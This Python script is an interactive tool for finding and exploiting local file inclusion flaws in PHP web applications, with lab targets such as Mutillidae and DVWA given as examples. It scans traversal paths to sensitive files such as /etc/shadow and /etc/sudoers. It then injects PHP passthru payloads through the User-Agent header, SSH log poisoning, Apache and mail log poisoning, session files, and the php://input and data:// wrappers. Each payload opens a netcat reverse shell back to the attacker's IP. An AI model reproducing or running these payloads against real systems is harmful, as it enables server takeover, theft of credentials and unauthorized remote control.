from os import error, strerror
import requests
import pyfiglet
import sys
import socket
import os
import base64
from SimpleTelnetMail import *


banner = pyfiglet.figlet_format("LFI")
print(banner)

linea = "----------------------------------------------------"
adverstiment = 'AAA'

def scanner():

    def url_scan(): 
        global url
        global respuesta
        global respuesta_bien
        url = input("Put Scan: (Example: http://192.168.0.125/mutillidae/?page=) ")
        respuesta = requests.get(url)
        respuesta_bien = respuesta.status_code
        print(respuesta_bien)
        if respuesta_bien == 200:
            print("Correct URL")
            print(linea)
            print("Starting Scan to...",url)
            print(linea)
            print("Results:")
        elif error:
            print("Invalid URL")
        else:
            print("Incorrect URL")

    url_scan()


    def etc_passwd():
        global final_url
        add = "/etc/passwd"
        final_url = url + add
        respuesta = requests.get(final_url)
        if respuesta_bien == 200:
            if "root" and "bin" in respuesta.text:
                print("LFI Vulnerabilitie in:",final_url)
            elif "404" in respuesta.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add = "/../../etc/passwd"
        final_url = url + add
        respuesta = requests.get(final_url)
        if respuesta_bien == 200:
            if "root" and "bin" in respuesta.text:
                print("LFI Vulnerabilitie in:",final_url)
            elif "404" in respuesta.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add = "/../../../../etc/passwd"
        final_url = url + add
        respuesta = requests.get(final_url)
        if respuesta_bien == 200:
            if "root" and "bin" in respuesta.text:
                print("LFI Vulnerabilitie in:",final_url)
            elif "404" in respuesta.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")


    etc_passwd()

    def etc_shadow():
        add1 = "/etc/shadow"
        final_url1 = url + add1
        respuesta1 = requests.post(final_url1)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta1.text:
                print("LFI Vulnerabilitie in:",final_url1)
            elif "404" in respuesta1.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add1 = "/../../etc/shadow"
        final_url1 = url + add1
        respuesta1 = requests.post(final_url1)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta1.text:
                print("LFI Vulnerabilitie in:",final_url1)
            elif "404" in respuesta1.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add1 = "/../../../../etc/shadow"
        final_url1 = url + add1
        respuesta1 = requests.post(final_url1)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta1.text:
                print("LFI Vulnerabilitie in:",final_url1)
            elif "404" in respuesta1.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    etc_shadow()

    def crontabs():
        add2 = "/var/spool/cron/crontabs/root"
        final_url2 = url + add2
        respuesta2 = requests.post(final_url2)
        if respuesta_bien == 200:
            if "For more information see the manual pages of crontab(5) and cron(8)" in respuesta2.text:
                print("LFI Vulnerabilitie in:",final_url2)
            elif "404" in respuesta2.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add2 = "/../../var/spool/cron/crontabs/root"
        final_url2 = url + add2
        respuesta2 = requests.post(final_url2)
        if respuesta_bien == 200:
            if "For more information see the manual pages of crontab(5) and cron(8)" in respuesta2.text:
                print("LFI Vulnerabilitie in:",final_url2)
            elif "404" in respuesta2.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add2 = "/../../../../var/spool/cron/crontabs/root"
        final_url2 = url + add2
        respuesta2 = requests.post(final_url2)
        if respuesta_bien == 200:
            if "For more information see the manual pages of crontab(5) and cron(8)" in respuesta2.text:
                print("LFI Vulnerabilitie in:",final_url2)
            elif "404" in respuesta2.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    crontabs()

    def etc_group():
        add3 = "/etc/group"
        final_url3 = url + add3
        respuesta3 = requests.post(final_url3)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta3.text:
                print("LFI Vulnerabilitie in:",final_url3)
            elif "404" in respuesta3.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add3 = "/../../etc/group"
        final_url3 = url + add3
        respuesta3 = requests.post(final_url3)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta3.text:
                print("LFI Vulnerabilitie in:",final_url3)
            elif "404" in respuesta3.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add3 = "/../../../../etc/group"
        final_url3 = url + add3
        respuesta3 = requests.post(final_url3)
        if respuesta_bien == 200:
            if "root" and "daemon" and "bin" in respuesta3.text:
                print("LFI Vulnerabilitie in:",final_url3)
            elif "404" in respuesta3.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")



    etc_group()


    def netplan():
        add4 = "/etc/netplan/01-network-manager-all.yaml"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "network" and "version" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../etc/netplan/01-network-manager-all.yaml"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "network" and "version" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../etc/netplan/01-network-manager-all.yaml"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "network" and "version" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        
    netplan()

    def etc_sudoers():
        add4 = "/etc/sudoers"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "root" and "ALL" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../etc/sudoers"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "root" and "ALL" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../etc/sudoers"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "root" and "ALL" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    etc_sudoers()

    def etc_grub():
        add4 = "/etc/grub.d/20memtest86+"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "bin" and "bash" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../etc/grub.d/20memtest86+"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "bin" and "bash" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../etc/grub.d/20memtest86+"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "bin" and "bash" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    etc_grub()


    def etc_timezone():
        add4 = "/etc/timezone"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "US" or "SP" or "Eastern" or "Western" or "FR" or "UK" or "CH" or "CA" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
            
    etc_timezone()


    def syslog():
        add4 = "/var/log/syslog"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "systemd" and "info" and "uid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../var/log/syslog"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "systemd" and "info" and "uid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../var/log/syslog"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "systemd" and "info" and "uid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    syslog()

    def environ():
        add4 = "/proc/self/environ"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "COLOR" and "LANG" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../proc/self/environ"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "COLOR" and "LANG" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../proc/self/environ"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "COLOR" and "LANG" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    environ()

    def cmd():
        add4 = "/proc/self/cmdline"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "@" and "^" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../proc/self/cmdline"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "@" and "^" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../proc/self/cmdline"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "@" and "^" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    cmd()



    def status():
        add4 = "/proc/self/status"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "Name" and "Groups" and "Pid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../proc/self/status"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "Name" and "Groups" and "Pid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")
        add4 = "/../../../../proc/self/status"
        final_url4 = url + add4
        respuesta4 = requests.post(final_url4)
        if respuesta_bien == 200:
            if "Name" and "Groups" and "Pid" in respuesta4.text:
                print("LFI Vulnerabilitie in:",final_url4)
            elif "404" in respuesta4.text:
                print("It is not vulnerable")
            else:
                print("It is not vulnerable")

    status()



def scanner_add():
    add4 = str(input("Put path of file what do you want to see: "))
    prova1 = str(input("Put one of the most common words in this file: "))
    prova2 = str(input("Put other common words in this file: "))
    final_url78 = url + add4
    respuesta4 = requests.post(final_url78)
    respuesta_bien = respuesta4.status_code
    if respuesta_bien == 200:
        if prova1 and prova2 in respuesta4.text:
            print("LFI Vulnerabilitie in:",final_url78)
        elif "404" in respuesta4.text:
            print("It is not vulnerable")
        else:
            print("It is not vulnerable")


def info():
    print("If this URL it's not vulnerable to LFI don't work all features")
    print(linea)
    question = str.lower(input("You want to see Open Ports?  y/n: "))
    if question == "y":
        open_ports()
    elif question == "n":
        pass
    else:
        print("Invalid option")

    question2 = str.lower(input("You want to see hostname of victim machine?  y/n: "))
    if question2 == "y":
        hostname()
    elif question2 == "n":
        pass
    else:
        print("Invalid option")
    
    question3 = str.lower(input("You want to see users and groups of victim machine?  y/n: "))
    if question3 == "y":
        users()
    elif question3 == "n":
        pass
    else:
        print("Invalid option")

def hostname():
    global url_info
    url_info = input("Put URL: \n(Example: http://192.168.0.125/mutillidae/?page=)")
    add = "/etc/hostname"
    final_url = url_info + add
    respuesta = requests.get(final_url)
    if respuesta == 200:
        print(final_url)
    else:
        print("Incorrect or No vulnearble page")
        

def open_ports():
    def scan(target):
        converted_ip = target
        print('\n' + 'Scanning target...: ' + str(target))
        for port in range(1, 3000):
            scan_port(converted_ip, port)
    def scan_port(ipaddress, port):
        try:
            global serv
            serv = socket.getservbyport(port)
            sock = socket.socket()
            sock.settimeout(0.02)
            sock.connect((ipaddress, port))                
            print('Port ' + str(port) + " Opened", "\t Service:", serv, "working")
        except:
            pass

    if __name__ == "__main__":
        targets = input('[+] Enter Target/s To Scan: ')
        if ',' in targets:
            for ip_add in targets.split(','):
                scan(ip_add.strip(' '))
        else:
            scan(targets)

def users():
    add = "/etc/groups"
    final_url = url_info + add
    respuesta = requests.get(final_url)
    if respuesta == 200:
        print(final_url)
    else:
        print("Incorrect or no vulnerable URL")

def proc_self_environ():
    print(linea)
    ip_local = input("Put your IP\nIP: ")
    pene = '<?passthru("nc -e /bin/sh '+ ip_local + ' 1212");?>'
    url_exploitation2 = url_exploitation + "/proc/self/environ"
    h = {'User-Agent':pene}
    r = requests.get(url_exploitation2,headers=h)
    a = r.request.headers
    responde = r.status_code
    print(responde)

def var_log_auth():
    fcinco = input("Put URL of /var/log/auth.log file\nExample: (http://192.168.0.130/dvwa/vulnerabilities/fi/?page=/var/log/auth.log)")
    os.system('gnome-terminal')
    print(linea)
    print("Put this in new terminal\nnc -vv -l -p 1212")
    print(linea)
    ip_m = str(input("Put your local IP: "))
    ip_s = str(input("Put IP of the Server Victim: "))
    question = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?   y/n: "))
    if question == "y":
        primera_part = 'ssh "<?passthru(base64_decode('
        segona_part = "nc -e /bin/bash "+ ip_m +" 1212"
        encodedd = str(base64.b64encode(segona_part.encode()))
        print(encodedd)
        tercera_part = "'));?>'@'+ ip_m +' &"
        final = 'ssh -o StrictHostKeyChecking=no "<?passthru(base64_decode(' + encodedd + "));?>" + '"@'+ ip_s +" &"
        print(final)
        os.system(final)
        requests.get(fcinco + "/var/log/auth.log")
        f5 = "firefox " + fcinco
        os.system(f5)
        print(linea)
        print("If there has been no positive result, put this URL in your browser: " + fcinco)
        print(linea)
        question2 = str.lower(input("This work correctly?:  y/n"))
        if question2 == "y":
            print("Perfect :)")
        elif question2 == "n":
            os.system(f5)
        elif KeyboardInterrupt:
            pass
        else:
            print("Invalid")
    else:
        print("Invalid")


def data_wrapper():
    print(linea)
    print("Put the command (nc -vv -l -p 1212) in new terminal!")
    print(linea)
    connnn = str.lower(input("You put the command (nc -vv -l -p 1212) in new terminal?   y/n"))
    if connnn == "y":
        lllurl = str.lower(input('Put URL  Example (http://192.168.0.125/mutillidae/index.php?page=)\n URL: '))
        ip_local__ = input("Put your Local IP: ")
        add_in_link = 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=nc -e ' +  ip_local__ + ' 1212'
        cc = requests.get(lllurl + add_in_link)
        print(cc)
    elif connnn == "n":
        print("Put the command")
    else:
        print("Error :(")


def posioning_apache():
    print(linea)
    print("Working...")
    distro = input("What Linux Distro are the Server Victim?\n1- Ubuntu/Debian Family\n2- CentOS/Red Hat Family\n3- FreeBSD\n4- I don't know, Try to discover\nOption: ")
    if distro == "1":
        urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
        print(linea)
        print("Put new terminal with this command: nc -vv -l -p 1212")
        netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
        local_ip = input("Put your Local IP: ")
        reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
        if netcat == "y":
            h = {"User-Agent":reverse_shell}
            pet = requests.get(urll + "/var/log/apache2/access.log",headers=h)
            result = pet.status_code
            headerss = pet.request.headers
            print(headerss)
            print(result)
            requests.get(urll + "/var/log/apache2/access.log")
            bien_ = input("Your nc terminal recived a connection?   y/n: ")
            if bien_ == "y":
                print("Perfect:)")
            elif bien_ == "n":
                os.system('firefox' + urll + '/var/log/apache2/access.log')
        elif netcat == "n":
            print("Put the comand and then execute this script")
        else:
            print("Error")
    elif distro == "2":
        urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
        print(linea)
        print("Put new terminal with this command: nc -vv -l -p 1212")
        netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
        local_ip = input("Put your Local IP: ")
        reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
        if netcat == "y":
            h = {"User-Agent":reverse_shell}
            pet = requests.get(urll + "/var/log/httpd/access_log",headers=h)
            result = pet.status_code
            headerss = pet.request.headers
            print(headerss)
            print(result)
            requests.get(urll + "/var/log/httpd/access_log")
            bien_ = input("Your nc terminal recived a connection?   y/n: ")
            if bien_ == "y":
                print("Perfect:)")
            elif bien_ == "n":
                os.system('firefox' + urll + ' /var/log/httpd/access_log')
        elif netcat == "n":
            print("Put the comand and then execute this script")
        else:
            print("Error")
    elif distro == "3":
        urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
        print(linea)
        print("Put new terminal with this command: nc -vv -l -p 1212")
        netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
        local_ip = input("Put your Local IP: ")
        reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
        if netcat == "y":
            h = {"User-Agent":reverse_shell}
            pet = requests.get(urll + "/var/log/httpd-access.log",headers=h)
            result = pet.status_code
            headerss = pet.request.headers
            print(headerss)
            print(result)
            requests.get(urll + "/var/log/httpd-access.log")
            bien_ = input("Your nc terminal recived a connection?   y/n: ")
            if bien_ == "y":
                print("Perfect:)")
            elif bien_ == "n":
                os.system('firefox' + urll + '/var/log/httpd-access.log')
        elif netcat == "n":
            print("Put the comand and then execute this script")
        else:
            print("Error")
    elif distro == "4":
        url = input("Put Scan: (Example: http://192.168.0.125/mutillidae/?page=) ")
        respuesta = requests.get(url)
        respuesta_bien = respuesta.status_code
        print(respuesta_bien)
        if respuesta_bien == 200:
            print("Correct URL")
            print(linea)
            print("Starting Scan to...",url)
            print(linea)
            print("Results:")
        elif error:
            print("Invalid URL")
        else:
            print("Incorrect URL")
        def os_release():
            add2 = "/etc/lsb-release"
            final_url2 = url + add2
            respuesta2 = requests.post(final_url2)
            if respuesta_bien == 200:
                if "Ubuntu" in respuesta2.text:
                    print("Is Ubuntu")
                    urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
                    print(linea)
                    print("Put new terminal with this command: nc -vv -l -p 1212")
                    netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
                    local_ip = input("Put your Local IP: ")
                    reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
                    if netcat == "y":
                        h = {"User-Agent":reverse_shell}
                        pet = requests.get(urll + "/var/log/apache2/access.log",headers=h)
                        result = pet.status_code
                        headerss = pet.request.headers
                        print(headerss)
                        print(result)
                        requests.get(urll + "/var/log/apache2/access.log")
                        bien_ = input("Your nc terminal recived a connection?   y/n: ")
                        if bien_ == "y":
                            print("Perfect:)")
                        elif bien_ == "n":
                            os.system('firefox' + urll + '/var/log/apache2/access.log')
                    elif netcat == "n":
                        print("Put the comand and then execute this script")
                    else:
                        print("Error")
                elif "CentOS" in respuesta2.text:
                    print("Is CentOS")
                    urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
                    print(linea)
                    print("Put new terminal with this command: nc -vv -l -p 1212")
                    netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
                    local_ip = input("Put your Local IP: ")
                    reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
                    if netcat == "y":
                        h = {"User-Agent":reverse_shell}
                        pet = requests.get(urll + "/var/log/httpd/access_log",headers=h)
                        result = pet.status_code
                        headerss = pet.request.headers
                        print(headerss)
                        print(result)
                        requests.get(urll + "/var/log/httpd/access_log")
                        bien_ = input("Your nc terminal recived a connection?   y/n: ")
                        if bien_ == "y":
                            print("Perfect:)")
                        elif bien_ == "n":
                            os.system('firefox' + urll + ' /var/log/httpd/access_log')
                    elif netcat == "n":
                        print("Put the comand and then execute this script")
                    else:
                        print("Error")            
                elif "freebsd" in respuesta2.text:
                    print("Is FreeBSD")
                    urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
                    print(linea)
                    print("Put new terminal with this command: nc -vv -l -p 1212")
                    netcat = str.lower(input("You put (nc -vv -l -p 1212) in new terminal?    y/n"))
                    local_ip = input("Put your Local IP: ")
                    reverse_shell = "<?passthru('nc -e /bin/sh " + local_ip + " 1212');?>"
                    if netcat == "y":
                        h = {"User-Agent":reverse_shell}
                        pet = requests.get(urll + "/var/log/httpd-access.log",headers=h)
                        result = pet.status_code
                        headerss = pet.request.headers
                        print(headerss)
                        print(result)
                        requests.get(urll + "/var/log/httpd-access.log")
                        bien_ = input("Your nc terminal recived a connection?   y/n: ")
                        if bien_ == "y":
                            print("Perfect:)")
                        elif bien_ == "n":
                            os.system('firefox' + urll + '/var/log/httpd-access.log')
                    elif netcat == "n":
                        print("Put the comand and then execute this script")
                    else:
                        print("Error")
        os_release()

def input_php():
    os.system('gnome-terminal')
    print(linea)
    print("Put the command (nc -vv -l -p 1212) in new terminal")
    print(linea)
    xdlol = input("You execut the command (nc -vv -l -p 1212) in new terminal?   y/n: ")
    if xdlol == "y":
        enviar = "<?php echo shell_exec($_GET['cmd']);?>"
        ip_m = input("Put your Local IP: ")
        command = 'nc -e /bin/bash '+ ip_m +' 1212'
        urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
        url = urll + 'php://input&cmd=' + command
        print(url)
        requests.post(url,data=enviar)
    elif xdlol == "n":
        print("Put the command")
    else:
        print("Error")


def sesion_cookies():
    print(linea)
    print("Put the command (nc -vv -l -p 1212) in new terminal!")
    print(linea)
    ncccc = str.lower(input("You put the command (nc -vv -l -p 1212) in new terminal?   y/n"))
    if ncccc == "y":
        link = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)\nURL: ")
        link2 = link + '/var/lib/php5/sess_s12cookie'
        local_ip = input("Put your Local IP: ")
        coki = {'Cookie':'PHPSESSID=s12cookie'}
        login = 'username=<?passthru("nc -e /bin/sh ' + local_ip + ' 1212");'
        a1212 = requests.post(link,headers=coki,data=login)
        b1212 = a1212.request.headers
        c1212 = requests.get(link2)
    elif ncccc == "n":
        print("Put the command...")
    else:
        print("Invalid Option")


def smtp_poisoning():
    print(linea)
    urllllll = input("Put URL of mail logs file (Example http://192.168.0.125/mutillidae/?page=/../../../var/log/mail): ")
    ip_l_meva = input("Put your Local Ip: ")
    os.system('gnome-terminal')
    print("Put the command (nc -vv -l -p 1212) in new terminal!")
    print(linea)
    penerudo = str.lower(input("You put the command (nc -vv -l -p 1212) in new terminal?   y/n: "))
    if penerudo == "y":
        tarrrjet = str(input("Put server Victim IP: "))
        email = "s12deff@gmail.com"
        port_smtp = input("Put port of SMTP Server (default 25): ")
        if not port_smtp:
            port_smtp = 25
        payload = "?php system($_GET['s12']);?"
        client = TelnetMail(tarrrjet, port= port_smtp, from_=email, to=["?php system($_GET['s12']);?","s12deff@gmail.com"], message="H4CKED")
        client.send_mail()

        print(repr(client))
        print(client)
        print(client.responses.decode())
        url_ultima_last = urllllll + '&s12= nc -e /bin/sh ' + ip_l_meva + ' 1212'
        print(url_ultima_last)
        requests.get(url_ultima_last)
    elif penerudo == "n":
        print("Put the command...")
    else:
        print("Invalid option")
    
    

def all_in_one():
    print(linea)
    print("First attack vector initializing...")
    os.system("gnome-terminal")
    print("Execute this command in the new terminal:\nnc -vv -l -p 1212")
    print(linea)
    global url_exploitation
    url_exploitation = input("Put URL: \n(Example: http://192.168.0.125/mutillidae/?page=)\nURL: ")
    proc_self_environ()
    print(linea)
    print("Second attack vector initializing...")
    var_log_auth()
    print(linea)
    print("Third attack vector initializing...")
    posioning_apache()
    print(linea)
    print("Fourth attack vector initializing...")
    input_php()
    print(linea)
    print("Fifth attack vector initializing...")
    sesion_cookies()
    print(linea)
    print("Sixth attack vector initializing...")
    data_wrapper()
    print(linea)
    print("Seventh attack vector initializing...")
    smtp_poisoning()




def exploitation():
    print("This are all the vectors of attack")
    pregunta22 = input("1- /proc/self/environ\n2- /var/log/auth.log\n3- Apache Log Poisoning\n4- php://input\n5- Php Sessions and Cookies\n6- Data Wrapper\n7- SMTP Poisoning\n8- All attacks in one\nOption: ")
    if pregunta22 == "1":
        os.system("gnome-terminal")
        print("Execute this command in the new terminal:\nnc -vv -l -p 1212")
        print(linea)
        global url_exploitation
        url_exploitation = input("Put URL: \n(Example: http://192.168.0.125/mutillidae/?page=)\nURL: ")
        proc_self_environ()
    elif pregunta22 == "2":
        var_log_auth()
    elif pregunta22 == "3":
        posioning_apache()
    elif pregunta22 == "4":
        input_php()
    elif pregunta22 == "5":
        sesion_cookies()
    elif pregunta22 == "6":
        data_wrapper()
    elif pregunta22 == "7":
        smtp_poisoning()
    elif pregunta22 == "8":
        all_in_one()
    else:
        print("Invalid option")


def choose():
    print("What you want to do?\n 1- Scanner LFI Vulnerabilitie\n 2- Exploit LFI Vulnerabilitie\n 3- Victim Info")
    pregunta = int(input("Option: "))
    print(linea)
    if pregunta == 1:
        pregunta2 = int(input("1- Scan \n2- Scan + Add File to scan\nOption: "))
        if pregunta2 == 1:
            scanner()
            print(linea,"----------------")
            print("If all are negative Try to go in",final_url)
        elif pregunta2 == 2:
            scanner()
            scanner_add()
    elif pregunta == 2:
        exploitation()
    elif pregunta == 3:
        info()
    
    
    
choose()
